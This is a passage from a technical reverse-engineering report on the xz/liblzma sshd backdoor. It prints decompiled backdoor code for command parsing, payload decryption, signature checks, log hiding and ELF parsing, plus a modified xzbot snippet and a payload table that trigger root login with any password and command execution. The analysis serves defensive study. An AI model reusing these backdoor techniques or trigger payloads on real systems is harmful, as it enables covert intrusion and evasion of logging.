As we can see, in all three cases, the `hook_main` backdoor function will be executed, which we will focus on in the next section.

# hook main

In this section we describe the functionality of the main hooking function `hook_main`.

After backdoor initialisation, `hook_main` will be executed when the `sshd` process calls the `RSA_public_decrypt` function to verify a client's public key during the SSH handshake:

```c
Status hook_main(RSA *r, global_ctx *ctx, uint32_t *status)
```

As discussed earlier, this function can be called in the context of three functions: `RSA_public_decrypt`, `RSA_get0_key`, `EVP_PKEY_set1_RSA`.

However, we only managed to trigger it with `RSA_public_decrypt` (if the backdoor finds a way to hook at least one of them, the others are skipped).

The pseudocode of the beginning of the `hook_main` function is shown below:

```c
  if ( !ctx )
  {
_exit:
    if ( !ret_status )
      return Error;
    goto _call_original;
  }
  if ( ctx->hook_finished
    || !rsa_key
    || (hfuncs = ctx->hfuncs) == 0LL
    || (RSA_get0_key = hfuncs->RSA_get0_key) == 0LL
    || !hfuncs->BN_bn2bin )
  {
    ctx->hook_finished = 1;
    goto _exit;
  }
  if ( status )
  {
    rsa = rsa_key;
    *ret_status = 1;
    RSA_get0_key(rsa, &n, &e, 0LL);
    if ( n )
    {
      if ( e )
      {
        ossl = ctx->hfuncs;
        if ( ossl )
        {
          BN_num_bits = ossl->BN_num_bits;
          if ( BN_num_bits )
          {
            n_bits = (BN_num_bits)();
            if ( n_bits <= 0x4000 )
            {
              n_bytes_count = (n_bits + 7) >> 3;

              // check n size in bytes
              if ( n_bytes_count - 20 <= 516 )
              {
                BN_bn2bin_res = ctx->hfuncs->BN_bn2bin(n, &modulus.magic_params);
                if ( BN_bn2bin_res >= 0 )
                {
                  n_size = n_bytes_count;
                  if ( n_bytes_count >= BN_bn2bin_res )
                  {
                    if ( BN_bn2bin_res <= 0x10 )
                      goto _call_original;
                    if ( !modulus.magic_params.a )
                      goto _call_original;
                    if ( !modulus.magic_params.b )
                      goto _call_original;

                    // 4 possible values: 0, 1, 2, 3
                    // bd_command = modulus.magic_params.c + modulus.magic_params.b * modulus.magic_params.a

                    // to get 0: -4294967295(0xffffffff00000001) + (-1 * 1)
                    // to get 1: 0 + (1 * 1)
                    // to get 2: 1 + (1 * 1)
                    // to get 3: 2 + (1 * 1)
                    bd_command = modulus.magic_params.c + modulus.magic_params.b * modulus.magic_params.a;
                    if ( bd_command > 3 )
                      goto _call_original;
    ...
```

It starts by parsing the client's public RSA key. It uses the `RSA_get0_key` function to obtain values for `BIGNUM *n` (modulus) and `BIGNUM *e` (exponent).

It then converts the RSA modulus `n` to bytes (`modulus`) using the `BN_bn2bin` function. These bytes correspond to the main payload of the command sent by the operator of the backdoor.

The structure of the modulus as follows:

```c
struct ciphertext_t
{
  uint8_t signature[114];
  uint8_t flags0;
  uint8_t flags1;
  uint8_t flags2;
  uint8_t length;
  uint8_t flags4;
  uint8_t command[121];
};

struct magic_params_t
{
  uint32_t a;
  uint32_t b;
  uint64_t c;
};

struct prefix_t
{
  uint8_t flags0;
  uint8_t flags1;
  uint8_t flags2;
  uint8_t length;
  uint8_t flags4;
};

struct modulus_t
{
  prefix_t cmd_bytes;
  magic_params_t magic_params;
  ciphertext_t ciphertext;
};
```

The backdoor calculates the value of `bd_command` from the values of `modulus.magic_params.c`, `modulus.magic_params.b`, and `modulus.magic_params.a`.

The resulting `bd_command` can take the values 0, 1, 2, and 3.

If the value is greater than 3, the backdoor bails and calls the original `RSA_public_decrypt` function.

If `bd_command` is valid, the backdoor proceeds to decrypt the ciphertext:

```c
...
    standard = ctx->standard;
    if ( standard )
    {
        if ( standard->getuid )
        {
        if ( standard->_exit )
        {
            if ( ctx->ssh_logs_p )
            {

            // check that ctx->secret_data will have the expected value
            if ( ctx->reg2reg_insn_count == 0x1C8 )
            {
                header_value = modulus.magic_params;
                // decrypt g_ctx->secret_data to get ed448_public_key
                if ( decrypt_ed448_public_key(ed448_public_key, ctx) )
                {
                // decrypt ciphertext using ed448_public_key[:32] as a key
                // and a, b, c as an IV
                if ( chacha20_decrypt(
                        modulus.ciphertext.signature,
                        n_bytes_count - 16,
                        ed448_public_key,
                        &header_value,
                        modulus.ciphertext.signature,
                        ctx->hfuncs) )
...
```

It decrypts `g_ctx->secret_data` to get `ed448_public_key`:

```c
Status __fastcall decrypt_ed448_public_key(uint8_t *out, global_ctx *ctx)
{
  hfuncs_t *hfuncs; // r9
  size_t i; // rcx
  uint32_t *p1; // rdi
  size_t j; // rcx
  uint32_t *p2; // rdi
  uint8_t key1[32]; // [rsp-20h] [rbp-B8h] BYREF
  uint8_t iv1[16]; // [rsp+0h] [rbp-98h] BYREF
  uint8_t key2[32]; // [rsp+10h] [rbp-88h] BYREF
  uint8_t iv2[16]; // [rsp+30h] [rbp-68h] BYREF

  if ( !out )
    return 0;
  if ( ctx )
  {
    hfuncs = ctx->hfuncs;
    if ( hfuncs )
    {
      i = 12LL;
      p1 = key1;
      while ( i )
      {
        *p1++ = 0;
        --i;
      }
      j = 28LL;
      p2 = key2;
      while ( j )
      {
        *p2++ = 0;
        --j;
      }
      if ( chacha20_decrypt(key1, 0x30uLL, key1, iv1, key2, hfuncs) )
        return chacha20_decrypt(ctx->secret_data, 0x39uLL, key2, iv2, out, ctx->hfuncs) != Error;
    }
  }
  return Error;
}
```

It then decrypts `modulus.ciphertext` using `ed448_public_key[:32]` as the key and `modulus.magic_params` as the IV.

The pseudocode of `chacha20_decrypt` function is shown below:

```c
Status __fastcall chacha20_decrypt(
        uint8_t *in,
        size_t length,
        uint8_t *key,
        uint8_t *iv,
        uint8_t *out,
        hfuncs_t *hfuncs)
{
  Status status; // ebp
  hfuncs_t *funcs; // r9
  EVP_CIPHER_CTX *ctx; // rbx
  unsigned __int8 *cipher; // rsi
  void (__fastcall *EVP_CIPHER_CTX_free0)(EVP_CIPHER_CTX *); // rdx
  void (__fastcall *EVP_CIPHER_CTX_free)(EVP_CIPHER_CTX *); // rax
  int (__fastcall *EVP_DecryptInit_ex)(EVP_CIPHER_CTX *, const EVP_CIPHER *, ENGINE *, const unsigned __int8 *, const unsigned __int8 *); // [rsp+8h] [rbp-50h]
  int outl; // [rsp+1Ch] [rbp-3Ch] BYREF

  outl = 0;
  if ( in )
  {
    if ( length )
    {
      if ( iv )
      {
        if ( out )
        {
          if ( hfuncs )
          {
            if ( check_ptrslen(&hfuncs->EVP_CIPHER_CTX_new, 6u) == Error )
            {
              ctx = funcs->EVP_CIPHER_CTX_new();
              if ( ctx )
              {
                EVP_DecryptInit_ex = hfuncs->EVP_DecryptInit_ex;
                cipher = hfuncs->EVP_chacha20();
                if ( EVP_DecryptInit_ex(ctx, cipher, 0LL, key, iv) == 1 )
                {
                  cipher = out;
                  if ( hfuncs->EVP_DecryptUpdate(ctx, out, &outl, in, length) == 1 && outl >= 0 )
                  {
                    cipher = &out[outl];
                    status = hfuncs->EVP_DecryptFinal_ex(ctx, cipher, &outl);
                    if ( status == Success )
                    {
                      EVP_CIPHER_CTX_free0 = hfuncs->EVP_CIPHER_CTX_free;
                      if ( outl >= 0 && length >= outl )
                      {
                        EVP_CIPHER_CTX_free0(ctx);
                        return status;
                      }
                    }
                  }
                }
                EVP_CIPHER_CTX_free = hfuncs->EVP_CIPHER_CTX_free;
                if ( EVP_CIPHER_CTX_free )
                  (EVP_CIPHER_CTX_free)(ctx);
              }
            }
          }
        }
      }
    }
  }
  return Error;
}
```

This gives the backdoor a decrypted ED448 signature (114 bytes).
The `ed448_public_key` is used for verification.

The signature verification routine is shown below:

```c
host_keys = sensitive_data->host_keys;
params0 = 0LL;
if ( host_keys )
{
  host_pubkeys = sensitive_data->host_pubkeys;
  if ( host_pubkeys )
  {

    if ( host_keys != host_pubkeys
      && sensitive_data->have_ssh2_key <= 1u )
    {
      // check for sensitive_data->host_keys
      if ( check_malloc_usable_size(host_keys, &params, ctx->standard) )
      {
        // check for sensitive_data->host_pubkeys
        if ( check_malloc_usable_size(
               ctx->sensitive_data->host_pubkeys,
               &params0,
               ctx->standard) )
        {
          params_c = params;
          if ( params == params0 )
          {
            ed448_public_key0 = &out;
            if ( decrypt_ed448_public_key(&out, ctx) )
            {
              host_pubkeys_index = 0LL;
              do
              {
                verified_key_index = host_pubkeys_index;
                if ( host_pubkeys_index >= params_c.param0 )
                  goto _finished;
                host_pubkeys_prev_index = host_pubkeys_index;
                value = &cmd_info;
                verification_status = verify_ed448_signature(
                                        ctx->sensitive_data->host_pubkeys[host_pubkeys_index],
                                        &cmd_info,
                                        hoffset + 4,
                                        604uLL,
                                        modulus.ciphertext.signature,
                                        ed448_public_key0,
                                        ctx);
                host_pubkeys_index = host_pubkeys_prev_index + 1;
              }
              while ( verification_status == Error );
              ctx->host_pubkey_index = verified_key_index;
...
```

Inside the `verify_ed448_signature` function the following happens:

- depending on the host public key type (EC, RSA, DSA), it parses the host public key and computes SHA256 from it
- it verify the signature using the message and ED448 public key, where the message has the following structure:
  - `bd_command` value
  - SHA256 from host public key
  - payload data except signature itself

Client-side signature calculation is well documented in the xzbot source code [here](https://github.com/amlweems/xzbot/blob/8ae5b706fb2c6040a91b233ea6ce39f9f09441d5/main.go#L85C1-L89C55).

If signature verification fails for all host public keys, the backdoor exits the `hook_main` function and calls the original `RSA_public_decrypt` function.

Thus, only ED448 private key holders can perform the attack.
In addition, even if the backdoor code (in its later functionality) contains binary vulnerabilities,
no one but the authors will be able to exploit them on infected systems.

The attacker's ED448 public key, which will be obtained during the backdoor operation (from `g_ctx->secret_data`) is shown below:

```
0a 31 fd 3b 2f 1f c6 92 92 68 32 52 c8 c1 ac 28
34 d1 f2 c9 75 c4 76 5e b1 f6 88 58 88 93 3e 48
10 0c b0 6c 3a be 14 ee 89 55 d2 45 00 c7 7f 6e
20 d3 2c 60 2b 2c 6d 31 00
```

## Dynamic analysis

We now explore the backdoor's handling of a command by a presumed attacker from a dynamic perspective. For our experiments, we used a patched version of the library as suggested in the [xzbot](https://github.com/amlweems/xzbot) project.

Below is an example of a fully encrypted payload being stored in RSA modulus value during a SSH connection by a potential attacker:

```
00000000  01 00 00 00 01 00 00 00  01 00 00 00 00 00 00 00  |................| <- magic_header
00000010  ed f6 02 f5 5f 25 72 4a  de 4f d0 0a 94 3f e2 71  |...._%rJ.O...?.q| <- encrypted data
00000020  bf f4 3b 12 80 1e 5d 81  89 e2 a3 83 de aa ea 2b  |..;...]........+|
00000030  1e 79 b0 f9 f0 24 ca a4  db 70 83 6a 17 d4 77 f6  |.y...$...p.j..w.|
00000040  d5 29 98 a7 32 a1 c0 8c  fd 81 26 1c ba 3a f0 8c  |.)..2.....&..:..|
00000050  2d ab e3 c6 ad 6d f8 11  18 83 a6 23 bc ff a5 61  |-....m.....#...a|
00000060  1c f3 3a c0 78 40 cd 08  b2 0a b1 3c 62 5e 73 b5  |..:.x@.....<b^s.|
00000070  6a 79 cd 3f 17 b8 84 eb  23 dc a9 83 1d 8c cd e9  |jy.?....#.......|
00000080  04 dc 95 50 eb 56 90 38  b1 72 1c 42 87 28 ef f5  |...P.V.8.r.B.(..|
00000090  84 e9 68 73 96 81 00 00  00 00 00 00 00 00 00 00  |..hs............|
```

After decrypting the ciphertext, the payload for `bd_command = 2` has the following structure:

```
-----------------------------------------------------------------
|                    signature (114 bytes)                      |
-----------------------------------------------------------------
|        cmd_byte_0 (8 bit)    |       cmd_byte_1 (8 bit)       |
-----------------------------------------------------------------
|        cmd_byte_2 (8 bit)    |       cmd_byte_3 (8 bit)       |
-----------------------------------------------------------------
|        cmd_byte_4 (8 bit)    |         command \x00           |
-----------------------------------------------------------------
```

Command 2 with `flag1 & 1` gives the possibility to insert a 32-bit `UID` value to execute commands from a specific user:

```
-----------------------------------------------------------------
|                    signature (114 bytes)                      |
-----------------------------------------------------------------
|        cmd_byte_0 (8 bit)    |       cmd_byte_1 (8 bit)       |
-----------------------------------------------------------------
|        cmd_byte_2 (8 bit)    |       command_length (8 bit)   |
-----------------------------------------------------------------
|        cmd_byte_4 (8 bit)    |       cmd_uid (32 bit)         |
-----------------------------------------------------------------
|                         command \x00                          |
-----------------------------------------------------------------
```

After decrypting the ciphertext, the `prefix_t` structure is filled with flag values:

```c
struct prefix_t
{
  uint8_t flags0;   ///< BdCommandFlag0
  uint8_t flags1;   ///< BdCommandFlag1
  uint8_t flags2;   ///< params
  uint8_t length;   ///< responsible for the payload command length, or in the case of bd_command 1, may be a replace_auth_answer data
  uint8_t flags4;   ///< params
};

```

By setting bit values in each of the 5 bytes, an attacker can trigger various functionality of the backdoor. We recovered the following potential functionality (specified via `flags0` and `flags1`):

```c
enum BdCommandFlag0
{
  F0_CALL_EXIT = 0x1,
  F0_MM_LOG_HANDLER_HOOK = 0x2,
  F0_DISABLE_LOGGING_SETLOGMASK = 0x4,
  F0_LOG_HANDLER_FLAG_1 = 0x8,
  F0_LOG_HANDLER_FLAG_2 = 0x10,
  F0_FD_FROM_FLAG1 = 0x20,
  F0_DISABLE_PAM = 0x40,
  F0_NOT_USE_HARDCODED_SIZE = 0x80,
};

enum BdCommandFlag1
{
  F1_UID_IN_COMMAND = 0x1,
  F1_CHANGE_MM_ANSWER_AUTHPASSWORD = 0x2,
  F1_USE_FLAGS_4 = 0x4,
  F1_RESERVED_0 = 0x8,                  ///< used with F0_FD_FROM_FLAG1
  F1_RESERVED_1 = 0x10,                 ///< used with F0_FD_FROM_FLAG1
  F1_RESERVED_2 = 0x20,                 ///< used with F0_FD_FROM_FLAG1
  F1_CALL_PSELECT_AND_EXIT = 0x40,      ///< used with 0x80
  F1_NOT_CHANGE_PERMIT_ROOT_LOGIN = 0x80,
};
```

At this point, we have confirmed the following functionality of the backdoor:

- RCE using `system`
- authentication bypass (login from root/user with any password)
- enable/disable logging using `setlogmask`
- enable/disable additional hooks (set `mm_log_handler` hook, `mm_asnwer_keyallowed` hook)
- paranoid mode, if the `-d` check fails
- enable flag to pass `gid` for command as the first byte of the payload
- enable root login (command 0)
- disable PAM

In addition, based on the analysed code we made the following assumptions:

- increase the length of the payload with key chains (with one key threat actors are limited to 0xff length)
- sshd IPC socket read/write activity

If the `F0_MM_LOG_HANDLER_HOOK` flag is enabled, even if `sshd` was started in debug mode with `-d`, the hook will try to handle logging to keep a low profile.
However, it seems that the threat actors didn't do a very good job of hiding the connection attempt at this point, so some traces of the authentication attempt will still be there.
Perhaps this was the reason why they introduced a `-d` argument kill switch beforehand, to be more stealthy until they manage to improve this module.

Examples with disabled/enabled `F0_MM_LOG_HANDLER_HOOK` flag (cleaned some debug messages for less noise) are shown below.
As we can see, the logs are different and with the flag enabled/disabled, i.e., we observe an additional "connection closed" event with the flag enabled, but in both cases the attacker obtains a shell.

Logging with `-d` and without the `F0_MM_LOG_HANDLER_HOOK` flag:

```
root@user:/home/user/xz-lzma# env -i LC_LANG=C LD_PRELOAD=$PWD/liblzma.so.5.6.1 /usr/sbin/sshd -p 22 -d
Server listening on 0.0.0.0 port 22.
Server listening on :: port 22.
Connection from 10.0.0.2 port 61899 on 10.0.0.1 port 22 rdomain ""
Failed publickey for root from 10.0.0.2 port 61899 ssh2: RSA-CERT SHA256:G1Q+4a0TgAHnlq2B8BKLZUP6wDHsjX6F5nVtUTU3dBQ ID  (serial 0) CA RSA SHA256:s3cBHP6c4j0tLaNyEE5f/1n7gjKuOJn8AWxp+nRPD7c
userauth_pubkey: parse key: invalid format [preauth]
Accepted password for root from 10.0.0.2 port 61899 ssh2
Starting session: shell for root from 10.0.0.2 port 61899 id 0
Connection closed by 10.0.0.2 port 61899
```

Logging with `-d` and with the `F0_MM_LOG_HANDLER_HOOK` enabled:

```
root@user:/home/user/xz-lzma# env -i LC_LANG=C LD_PRELOAD=$PWD/liblzma.so.5.6.1 /usr/sbin/sshd -p 22 -d
Server listening on 0.0.0.0 port 22.
Server listening on :: port 22.
Connection from 10.0.0.2 port 61881 on 10.0.0.1 port 22 rdomain ""
Connection closed by authenticating user root 10.0.0.2 port 61881 [preauth]
```

Otherwise, if `sshd` is started without the `-d` flag, the backdoor can become fully stealthy and it's very difficult to detect a connection attempt.
Especially if the `F0_DISABLE_PAM` flag is also enabled.

`journalctl -t sshd` with `F0_DISABLE_PAM` flag disabled will leave some traces of the connection attempt:

```
Apr 11 14:56:59 user sshd[37074]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Apr 11 14:56:59 user sshd[37074]: pam_env(sshd:session): deprecated reading of user environment enabled
Apr 11 14:57:02 user sshd[37074]: pam_unix(sshd:session): session closed for user root
```

The pseudocode for the `set_mm_log_handler_hook` function (which performs the `mm_log_handler` hook installation) is shown below:

```c
Status __fastcall set_mm_log_handler_hook(modulus_t *modulus, global_ctx *ctx)
{
  ssh_logs *ssh_logs; // rax
  char *func_mm_log_handler_ptr; // rdx
  unsigned __int64 *mm_log_handler_hook_ptr; // rcx
  void *handle_logging; // r9
  uint8_t flags0; // di
  unsigned __int64 mm_log_hander_hook; // r8
  unsigned __int64 *mm_log_handler_hook; // rt0
  uint64_t mm_log_handler_hook_addr; // rcx

  ssh_logs = ctx->ssh_logs_p;
  if ( !modulus )
    return Error;
  if ( !ssh_logs )
    return Error;
  func_mm_log_handler_ptr = ssh_logs->func_mm_log_handler_ptr;
  if ( !func_mm_log_handler_ptr )
    return Error;
  mm_log_handler_hook_ptr = ssh_logs->mm_log_handler_hook_p;
  if ( !mm_log_handler_hook_ptr )
    return Error;
  handle_logging = ssh_logs->handle_logging;
  if ( !handle_logging || !ssh_logs->mm_log_handler_checked )
    return Error;
  flags0 = modulus->cmd_bytes.flags0;
  if ( (flags0 & F0_LOG_HANDLER_FLAG_1) != 0 && ctx->getuid_res )
    return Success;
  mm_log_hander_hook = *mm_log_handler_hook_ptr;
  if ( *mm_log_handler_hook_ptr && mm_log_hander_hook >= ctx->sshd_code_start && mm_log_hander_hook < ctx->sshd_code_end )
  {
    ssh_logs->func_mm_log_handler_ptr = mm_log_handler_hook_ptr;
    ssh_logs->mm_log_handler_hook_p = func_mm_log_handler_ptr;
    mm_log_handler_hook = mm_log_handler_hook_ptr;
    mm_log_handler_hook_ptr = func_mm_log_handler_ptr;
    func_mm_log_handler_ptr = mm_log_handler_hook;
  }
  mm_log_handler_hook_addr = *mm_log_handler_hook_ptr;
  ssh_logs->mm_log_hander_original = *func_mm_log_handler_ptr;
  ssh_logs->mm_log_hander_hook = mm_log_handler_hook_addr;
  if ( (flags0 & F0_LOG_HANDLER_FLAG_1) != 0 )
  {
    if ( (flags0 & F0_LOG_HANDLER_FLAG_2) == 0
      || ssh_logs->str__s_key_ptr && ssh_logs->str__connection_closed_by_ptr && ssh_logs->str_preauth_ptr )
    {
      goto _exit;
    }
    return Error;
  }
  ssh_logs->used = 1;
_exit:
  *func_mm_log_handler_ptr = handle_logging;
  return Success;
}
```

To test the functionality of the backdoor, we used a modified `xzbot` project:

```go
type xzSigner struct {
  signingKey    ed448.PrivateKey
  encryptionKey []byte
  hostkey       []byte
  cert          *ssh.Certificate
  command       int
  payload       []byte
}

func (s *xzSigner) PublicKey() ssh.PublicKey {
  if s.cert != nil {
    return s.cert
  }

  magic1 := uint32(0x1234)
  magic2 := uint32(0x5678)
  magic3 := uint64(0xfffffffff9d9ffa1)

  if s.command == 0 {
    magic3 = uint64(0xfffffffff9d9ffa0)
  } else if s.command == 1 {
    magic3 = uint64(0xfffffffff9d9ffa1)
  } else if s.command == 2 {
    magic3 = uint64(0xfffffffff9d9ffa2)
  } else if s.command == 3 {
    magic3 = uint64(0xfffffffff9d9ffa3)
  }

  magic := uint32(uint64(magic1)*uint64(magic2) + magic3)
  ...
}
```

The table below describes the command and payload values used to trigger interesting backdoor functionality:

| command | payload                                                              | description                                                                                                |
| ------- | -------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| `1`     | `[]byte{0b00001001, 0b00001101, 0b00000000, 0b00000001, 0b00000000}` | allows subsequent connections to use any password to obtain an interactive session as an unprivileged user |
| `1`     | `[]byte{0b00001001, 0b00001100, 0b00000000, 0b00000001, 0b00000000}` | allows subsequent conntections to use any password to obtain an interactive session as the `root` user     |
| `2`     | `[]byte{0x0, 0x0, 0x0, command_len, 0x0, command, 0x0}`              | allows execution of a command using `system`                                                               |
| `2`     | `[]byte{0x0, 0b00000001, 0x0, command_len, 0x0, uid, command, 0x0 }` | allows execution of a command using `system` with a specific user ID                                       |

# Primitives

In this part of our report, we document various primitives used by the backdoor that are glossed over in other sections.

## Strings

The backdoor uses a radix tree (radix/prefix trie) [3] to store strings in memory.

The `reverse_trie_lookup` function located at `.text.simple_coder_updata:000000000000A8B0` is responsible for obtaining a string ID for a given address.

The tables used for decoding are located in the `.rodata.lzip_decode0` and `.rodata.crc64_clmul1` segments of the object file.

The list of strings and a Python-based decoder can be found at the following links (thank you @q3k):

- https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01
- https://gist.github.com/q3k/3fadc5ce7b8001d550cf553cfdc09752

To simplify reverse engineering (string navigation), we have integrated the above [into IDA](./helpers/).

## ELF parsing

During operation, the backdoor performs various functionalities such as restoring imports and checking memory regions. To do this, it has its own ELF parser and a custom structure to represent the ELF following parsing. This is documented below:

```c
struct elf_info
{
  Elf64_Ehdr *ehdr;                     ///< pointer to ELF structure
  uint64_t first_pt_load_vaddr;         ///< smallest vaddr for PT_LOAD entry
  uint64_t program_headers;             ///< program headers list
  uint32_t e_phnum;                     ///< program header count
  uint32_t reserved0;
  Elf64_Dyn *dynamic;                   ///< .dynamic start
  uint64_t dynamic_count;               ///< number of elements in .dynamic
  uint64_t dynstr;                      ///< .dynstr start
  Elf64_Sym *dynsym;                    ///< .dynsym start
  Elf64_Rela *rela_plt;                 ///< .rela.plt start
  uint32_t rela_plt_count;              ///< number of elements in .rela.plt
  uint32_t gnu_relro_found;             ///< item with PT_GNU_RELRO is found
  uint64_t gnu_relro_vaddr;             ///< vaddr for PT_GNU_RELRO program header
  uint64_t gnu_relro_memsz;             ///< memsz for PT_GNU_RELRO program header
  Elf64_Verdef *verdef;                 ///< value for DT_VERDEF
  uint64_t verdefnum;                   ///< value for DT_VERDEFNUM
  Elf64_Versym *gnu_version;            ///< value for DT_VERSYM
  Elf64_Rela *rela_dyn;                 ///< .rela.dyn start
  uint64_t rela_dyn_count;              ///< number of elements in .rela.dyn
  Elf64_Rela *relr_relocs;              ///< value for DT_PREINIT_ARRAY|DT_HASH
  uint32_t relr_relocs_count;           ///< number of elements in program header with DT_EXTRANUM|DT_PREINIT_ARRAY
  uint32_t reserved1;
  uint64_t code_segment_start;
  uint64_t code_segment_size;
  uint64_t reserved2[2];
  uint64_t file_end;
  uint64_t file_padding_size;
  uint64_t mem_padding_size;
  uint8_t custom_flags;                 ///< custom flags that depend on the flags in .dynamic
  uint8_t reserved3[7];
  uint32_t gnuhash_nbuckets;            ///< GNU hash table fields
  uint32_t gnuhash_bloom_size;
  uint32_t gnuhash_bloom_shift;
  uint32_t reserved4;
  uint64_t *gnuhash_bloom_start;
  uint32_t *gnuhash_buckets;
  uint32_t *gnuhash_chain;
};
```

The pseudocode for the parsing function is shown below:

```c
Status __fastcall parse_elf(Elf64_Ehdr *ehdr, elf_info_t *elf_info)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  if ( ehdr )
  {
    if ( !elf_info )
      return Error;
    size = 62;
    p_first_pt_load_vaddr = &elf_info->first_pt_load_vaddr;
    first_pt_load_vaddr = -1;
    phdr_index = 0;
    while ( size )
    {
      *p_first_pt_load_vaddr = 0;
      p_first_pt_load_vaddr = (p_first_pt_load_vaddr + 4);
      --size;
    }
    elf_info->ehdr = ehdr;
    last_pt_dynamic_index = -1;
    e_phnum = ehdr->e_phnum;
    program_headers = &ehdr->e_ident[ehdr->e_phoff];
    LOWORD(elf_info->e_phnum) = e_phnum;
    elf_info->program_headers = program_headers;
    phdr = program_headers;

    // process program headers
    while ( phdr_index < e_phnum )
    {
      p_type = phdr->__p_type;
      if ( phdr->__p_type == PT_LOAD )
      {
        if ( first_pt_load_vaddr > phdr->p_vaddr )
          first_pt_load_vaddr = phdr->p_vaddr;
      }
      else if ( p_type == PT_DYNAMIC )
      {
        last_pt_dynamic_index = phdr_index;
      }
      else if ( is_gnu_relro(p_type, 0xA0000000) )
      {
        if ( elf_info->gnu_relro_found )
          // error: more then 1 PT_GNU_RELRO segments found
          return Error;
        elf_info->gnu_relro_vaddr = phdr->p_vaddr;
        gnu_relro_memsz = phdr->p_memsz;
        elf_info->gnu_relro_found = 1;
        elf_info->gnu_relro_memsz = gnu_relro_memsz;
      }
      ++phdr_index;
      ++phdr;
    }
    if ( first_pt_load_vaddr == -1 )
      return Error;
    if ( last_pt_dynamic_index == -1 )
      return Error;
    elf_info->first_pt_load_vaddr = first_pt_load_vaddr;
    pt_dynamic = &program_headers[last_pt_dynamic_index];
    pt_dynamic_memsz = pt_dynamic->p_memsz;
    dynamic = &ehdr->e_ident[pt_dynamic->p_vaddr - first_pt_load_vaddr];
    elf_info->dynamic = dynamic;
    LODWORD(elf_info->dynamic_count) = pt_dynamic_memsz >> 4;
    pt_dynamic_num_of_entries = pt_dynamic_memsz >> 4;
    if ( validate_memory_range(elf_info, dynamic, pt_dynamic_memsz, PF_R) == Error )
      return Error;
    d_val_addr = &dynamic->d_un;
    verdefnum_found = 0;
    dt_extranum_dt_preinit_array_value = -1;
    d_relasz_value = -1;
    d_pltrelsz_value = -1;
    dt_gnuhash_value = 0;
    for ( i = 0; pt_dynamic_num_of_entries != i; ++i )
    {
      dyn_item.d_tag = *(d_val_addr - 1);
      if ( !dyn_item.d_tag )
      {
        LODWORD(elf_info->dynamic_count) = i;
        break;
      }
      if ( dyn_item.d_tag <= 0x24 )
      {
        if ( dyn_item.d_tag > 0x16 )
        {
          switch ( dyn_item.d_tag )
          {
            case DT_JMPREL:
              elf_info->rela_plt = *d_val_addr;
              break;
            case DT_BIND_NOW:
              goto _label1;
            case DT_FLAGS:
              is_not_df_bind_now = (*d_val_addr & DF_BIND_NOW) == 0;
              goto _label2;
            case DT_EXTRANUM|DT_PREINIT_ARRAY:
              dt_extranum_dt_preinit_array_value = *d_val_addr;
              break;
            case DT_PREINIT_ARRAY|DT_HASH:
              elf_info->relr_relocs = *d_val_addr;
              break;
            default:
              break;
          }
        }
        else
        {
          switch ( dyn_item.d_tag )
          {
            case DT_PLTRELSZ:
              d_pltrelsz_value = *d_val_addr;
              break;
            case DT_STRTAB:
              elf_info->dynstr = *d_val_addr;
              break;
            case DT_SYMTAB:
              elf_info->dynsym = *d_val_addr;
              break;
            case DT_RELA:
              elf_info->rela_dyn = *d_val_addr;
              break;
            case DT_RELASZ:
              d_relasz_value = *d_val_addr;
              break;
            default:
              break;
          }
        }
      }
      else if ( dyn_item.d_tag == DT_FLAGS_1 )
      {
        is_not_df_bind_now = (*d_val_addr & DF_1_NOW) == 0;
_label2:
        if ( !is_not_df_bind_now )
_label1:
          elf_info->custom_flags |= 0x20;
      }
      else if ( dyn_item.d_tag > DT_FLAGS_1 )
      {
        switch ( dyn_item.d_tag )
        {
          case DT_VERDEFNUM:
            verdefnum_found = 1;
            elf_info->verdefnum = *d_val_addr;
            break;
          case DT_HIPROC:
            return Error;
          case DT_VERDEF:
            elf_info->verdef = *d_val_addr;
            break;
        }
      }
      else if ( dyn_item.d_tag > DT_AUDIT )
      {
        if ( dyn_item.d_tag == DT_VERSYM )
        {
          dt_versym_value = *d_val_addr;
          elf_info->custom_flags |= 0x10;
          elf_info->gnu_version = dt_versym_value;
        }
      }
      else
      {
        if ( dyn_item.d_tag > DT_CONFIG )
          return Error;
        if ( dyn_item.d_tag == DT_GNU_HASH )
          dt_gnuhash_value = *d_val_addr;
      }
      d_val_addr += 2;
    }
    rela_plt = elf_info->rela_plt;
    if ( rela_plt )
    {
      if ( d_pltrelsz_value == -1 )
        return Error;
      elf_info->custom_flags |= 1;
      elf_info->rela_plt_count = d_pltrelsz_value / 0x18;
    }
    rela_dyn = elf_info->rela_dyn;
    if ( rela_dyn )
    {
      if ( d_relasz_value == -1 )
        return Error;
      elf_info->custom_flags |= 2;
      LODWORD(elf_info->rela_dyn_count) = d_relasz_value / 24;
    }
    relr_relocs = elf_info->relr_relocs;
    if ( relr_relocs )
    {
      if ( dt_extranum_dt_preinit_array_value == -1 )
        return Error;
      elf_info->custom_flags |= 4;
      elf_info->relr_relocs_count = dt_extranum_dt_preinit_array_value >> 3;
    }
    if ( elf_info->verdef )
    {
      if ( verdefnum_found )
        elf_info->custom_flags |= 8;
      else
        elf_info->verdef = 0;
    }
    dynstr_ptr = elf_info->dynstr;
    if ( dynstr_ptr )
    {
      dynsym = elf_info->dynsym;
      if ( dt_gnuhash_value )
      {
        if ( dynsym )
        {
          if ( ehdr >= dynstr_ptr )
          {
            elf_info->dynstr = &ehdr->e_ident[dynstr_ptr];
            elf_info->dynsym = (dynsym + ehdr);
            if ( rela_plt )
              elf_info->rela_plt = (rela_plt + ehdr);
            if ( rela_dyn )
              elf_info->rela_dyn = (rela_dyn + ehdr);
            if ( relr_relocs )
              elf_info->relr_relocs = (relr_relocs + ehdr);
            gnu_version = elf_info->gnu_version;
            if ( gnu_version )
              elf_info->gnu_version = (gnu_version + ehdr);
            dt_gnuhash_value = (dt_gnuhash_value + ehdr);
          }
          verdef = elf_info->verdef;
          if ( verdef && verdef < ehdr )
            elf_info->verdef = &ehdr->e_ident[verdef];
          if ( !elf_info->rela_plt || validate_memory_range(elf_info, elf_info->rela_plt, d_pltrelsz_value, PF_R) )
          {
            v35 = elf_info->rela_dyn;
            if ( !v35 || validate_memory_range(elf_info, v35, d_relasz_value, PF_R) )
            {
              v36 = elf_info->relr_relocs;
              if ( !v36 || validate_memory_range(elf_info, v36, dt_extranum_dt_preinit_array_value, 4) )
              {
                v37 = elf_info->verdef;
